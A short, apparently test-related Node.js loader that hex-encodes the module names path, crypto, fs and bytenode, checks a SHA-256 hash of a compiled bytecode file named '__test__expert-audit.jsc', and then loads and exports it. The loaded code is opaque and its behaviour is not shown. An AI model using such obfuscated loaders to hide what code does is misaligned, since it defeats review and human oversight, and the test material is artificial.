"use strict";
var _76be06d=function(h){for(var r="",i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r};
var _76be06p=require(_76be06d("70617468")).join(__dirname,"./__test__expert-audit.jsc");
var _76be06h=require(_76be06d("63727970746f")).createHash("sha256").update(require(_76be06d("6673")).readFileSync(_76be06p)).digest("hex");
if(_76be06h!==("34c711d554c7f566db1fe098bf96d85a"+"55a70678979a0493a52d4ff13488d6fd")){console.error("[fatal] integrity check failed");process.exit(1);}
require(_76be06d("627974656e6f6465"));
var _76be06m=require(_76be06p);

exports.default=_76be06m.default!==void 0?_76be06m.default:_76be06m;
